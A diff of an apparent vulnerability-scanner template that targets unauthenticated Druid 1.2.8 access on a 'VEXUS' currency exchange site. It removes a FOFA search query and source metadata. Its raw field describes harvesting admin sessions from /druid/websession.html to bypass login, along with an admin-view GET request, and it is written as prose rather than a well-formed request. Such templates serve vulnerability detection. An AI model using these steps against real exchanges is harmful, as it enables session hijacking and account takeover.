@@ -3,19 +3,14 @@ info:
   name: VEXUS多语言货币交易所存在Druid 未授权访问漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ntuufu3951s9g3g8'
+  description: ''
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ntuufu3951s9g3g8
-    fofa: '"image/n2.png" && "public/login.action"'
 http:
 - raw:
   - 'Druid版本为 1.2.8，存在未授权访问漏洞，直接访问 /druid/index.html 即可进入
 
     访问 /druid/websession.html 这里还存储了所有登陆后台的Session，只需要找到可用Session的即可直接绕过登录后台。
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739445796645-986e8d28-0c77-4218-a273-984c20fd93a1.png)
 
     GET /normal/LoginSuccessAction!view.action?username=admin HTTP/1.1
 
